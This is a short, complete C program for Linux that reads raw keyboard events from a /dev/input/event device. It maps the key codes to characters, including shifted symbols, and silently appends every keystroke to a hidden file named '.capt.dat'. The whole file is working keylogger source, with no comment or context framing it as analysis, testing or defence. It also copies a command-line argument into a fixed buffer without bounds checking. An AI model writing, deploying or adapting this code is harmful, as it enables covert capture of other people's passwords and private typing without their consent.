#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdbool.h>
#include <string.h>

#define EVENT_FILE "/dev/input/event"
#define OUTPUT_FILE ".capt.dat"
#define MAX_KEY 127
#define KEY_BACKSPACE 14
#define KEY_DEL 111
#define KEY_LEFTSHIFT 42
#define KEY_RIGHTSHIFT 54

// ASCII maps
char ascii_map[MAX_KEY + 1] = {
    [2] = '1', [3] = '2', [4] = '3', [5] = '4', [6] = '5', [7] = '6', [8] = '7', [9] = '8', [10] = '9', [11] = '0',
    [12] = '-', [13] = '=', [16] = 'q', [17] = 'w', [18] = 'e', [19] = 'r', [20] = 't', [21] = 'y', [22] = 'u', [23] = 'i', [24] = 'o', [25] = 'p',
    [26] = '[', [27] = ']', [28] = '\n',
    [30] = 'a', [31] = 's', [32] = 'd', [33] = 'f', [34] = 'g', [35] = 'h', [36] = 'j', [37] = 'k', [38] = 'l', [39] = ';', [40] = '\'',
    [41] = '`', [44] = 'z', [45] = 'x', [46] = 'c', [47] = 'v', [48] = 'b', [49] = 'n', [50] = 'm', [51] = ',', [52] = '.', [53] = '/',
    [57] = ' ',
};

char shift_map[MAX_KEY + 1] = {
    [2] = '!', [3] = '@', [4] = '#', [5] = '$', [6] = '%', [7] = '^', [8] = '&', [9] = '*', [10] = '(', [11] = ')',
    [12] = '_', [13] = '+', [16] = 'Q', [17] = 'W', [18] = 'E', [19] = 'R', [20] = 'T', [21] = 'Y', [22] = 'U', [23] = 'I', [24] = 'O', [25] = 'P',
    [26] = '{', [27] = '}', [30] = 'A', [31] = 'S', [32] = 'D', [33] = 'F', [34] = 'G', [35] = 'H', [36] = 'J', [37] = 'K', [38] = 'L', [39] = ':',
    [40] = '"', [41] = '~', [44] = 'Z', [45] = 'X', [46] = 'C', [47] = 'V', [48] = 'B', [49] = 'N', [50] = 'M', [51] = '<', [52] = '>', [53] = '?',
};
char eventpath[255];

int main(int argc, char *argv[]) {
    strcpy(eventpath, "\0");
    strcpy(eventpath, EVENT_FILE);
    if (argc < 2) 
    {
	    strcat(eventpath, "0");
    } else
    {
	    strcat(eventpath, argv[1]);
    }
    //printf("%s\n", eventpath); it defaults to event0 if no number is specified
    int fd = open(eventpath, O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        perror("Failed to open input device");
        return 1;
    }

    FILE *output = fopen(OUTPUT_FILE, "a");
    if (!output) {
        perror("Failed to open output file");
        close(fd);
        return 1;
    }

    struct input_event ev;
    _Bool shift = false;

    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n != sizeof(ev)) continue;

        if (ev.type == EV_KEY) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shift = ev.value; // 1 = pressed, 0 = released
            } else if (ev.value == 1) { // Key press
                if (ev.code == KEY_BACKSPACE) {
                    fprintf(output, "[B]");
                } else if (ev.code == KEY_DEL) {
                    fprintf(output, "[D]");
                } else if (ev.code <= MAX_KEY) {
                    char ascii = shift ? shift_map[ev.code] : ascii_map[ev.code];
                    if (ascii) {
                        fprintf(output, "%c", ascii);
                    }
                }
                fflush(output);
            }
        }
    }

    close(fd);
    fclose(output);
    return 0;
}

